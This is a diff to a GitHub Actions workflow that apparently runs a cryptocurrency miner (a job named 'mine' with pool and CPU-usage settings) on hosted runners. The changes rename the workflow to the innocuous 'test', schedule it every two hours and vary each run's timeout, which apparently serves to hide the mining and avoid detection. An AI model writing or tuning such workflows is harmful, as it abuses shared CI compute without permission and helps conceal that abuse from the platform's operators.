@@ -1,14 +1,14 @@
-name: X
+name: test
 
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 */60 * * *'
+    - cron: '0 */2 * * *'
 
 jobs:
   mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: ${{ fromJSON('[45, 46, 47, 48, 49, 50]')[github.run_number % 6] }}
     strategy:
       matrix:
         runner: [1, 2]
@@ -85,7 +85,8 @@ jobs:
               "memory-pool": true,
               "asm": "auto",
               "argon2-impl": "auto",
-              "max-cpu-usage": 80
+              "max-cpu-usage": 80,
+              "max-threads-hint": 80
             },
             "pools": [
               {
